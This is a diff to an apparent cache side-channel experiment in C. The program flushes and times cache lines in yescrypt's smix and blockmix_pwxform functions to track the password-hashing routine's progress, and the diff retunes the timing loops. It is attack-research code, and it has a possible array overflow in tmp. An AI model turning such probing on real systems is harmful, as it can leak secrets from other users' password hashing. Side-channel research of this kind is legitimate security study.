@@ -67,7 +67,7 @@ int main() {
     //void (*pwxform)() = dlsym(handle_libyescrypt, "pwxform");
     //clflush((uint64_t) blockmix_pwxform + 0x20);
     //mfence();
-    
+    int tmp[8000];
     do {
         t = measure_one_block_access_time((uint64_t) smix);
         clflush((uint64_t) smix);
@@ -80,28 +80,28 @@ int main() {
         //ticker
         int iterations = 0;
         do {
-            t = measure_one_block_access_time((uint64_t) blockmix_pwxform + 0x23);
-            clflush((uint64_t) blockmix_pwxform +0x23);
+            clflush((uint64_t) blockmix_pwxform + 0x23);
             mfence();
-            //clflush((uint64_t) pwxform);
-            //mfence();
-            wait_cycles(500);
+            wait_cycles(5000);
+            t = measure_one_block_access_time((uint64_t) blockmix_pwxform + 0x23);
             iterations++;
-        } while (t > 100 && iterations < 5000000);
-        if (iterations == 5000000) {
+        } while (iterations < 0 || t > 100 && iterations < 10000);
+        if (iterations == 10000) {
             printf("\nlast t: %d\n", t);
             printf("itarations: %d\n", iterations);
             break;
             
         }
+        tmp[ticker] = iterations;
         ticker++;
         
         //this needes to be tuned (is yescrypt slowed down?) 
-        wait_cycles(20000);
+        //wait_cycles(20000);
         //printf("cycles: %d\n", end-start);
     } while (1);
-    
+
     printf("\nticker: %d\n", ticker);
+    for (int i=0; i<ticker; i++) printf("iterations: %d\n", tmp[i]);
     
     return 0;
 }
